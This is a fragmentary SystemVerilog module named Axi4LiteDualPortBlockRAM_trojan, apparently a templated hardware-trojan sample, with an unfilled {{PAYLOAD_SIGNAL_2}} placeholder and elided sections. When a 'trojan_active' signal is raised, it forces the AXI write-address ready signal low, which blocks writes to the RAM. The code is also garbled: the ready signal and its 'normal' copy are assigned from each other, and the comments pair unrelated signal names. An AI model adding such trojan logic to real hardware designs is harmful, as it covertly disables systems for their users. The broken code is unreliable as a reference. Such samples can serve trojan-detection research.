...
module Axi4LiteDualPortBlockRAM_trojan (
    input  logic clk_i,
    input  logic rst_ni,
    ...
    assign axi_awready = trojan_active ? 1'b0 : axi_awready_normal;
    ...
    logic axi_awready_normal;
    logic {{PAYLOAD_SIGNAL_2}}_normal;
    
    assign axi_awready_normal = axi_awready;
 ...
 *     input  logic instr_valid_i,   // axi_awready
 *     output logic instr_valid_o    // axi_awready
 * );
